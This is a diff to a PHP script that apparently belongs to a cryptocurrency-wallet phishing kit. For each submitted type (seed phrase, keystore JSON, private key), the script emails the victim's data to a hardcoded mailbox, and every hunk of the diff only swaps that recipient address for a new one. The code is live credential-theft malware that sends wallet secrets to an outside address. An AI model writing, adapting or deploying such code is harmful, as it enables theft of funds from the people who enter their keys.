@@ -12,7 +12,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'phrase') {
 
 		$msg_packet=wordwrap($msg_packet,70);
 
-		$auto_mechanic='fthompson2019@yahoo.com';
+		$auto_mechanic='jeffheart7@gmail.com';
 
 
 	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:fthompson2019@yahoo.com');
@@ -33,7 +33,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'keystorejson') {
 
 		$msg_packet=wordwrap($msg_packet,70);
 
-    $auto_mechanic='fthompson2019@yahoo.com';
+    $auto_mechanic='jeffheart7@gmail.com';
    
 
 	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Result) Box Submission', $msg_packet,'From:fthompson2019@yahoo.com');
@@ -52,7 +52,7 @@ if(isset($_POST['import_type']) && $_POST['import_type'] === 'private') {
 
 		$msg_packet=wordwrap($msg_packet,70);
 
-		$auto_mechanic='fthompson2019@yahoo.com';
+		$auto_mechanic='jeffheart7@gmail.com';
    
 	    mail($auto_mechanic, ucwords($wallet_macintosh).' Box(Private Key) Box Submission', $msg_packet,'From:fthompson2019@yahoo.com');
      
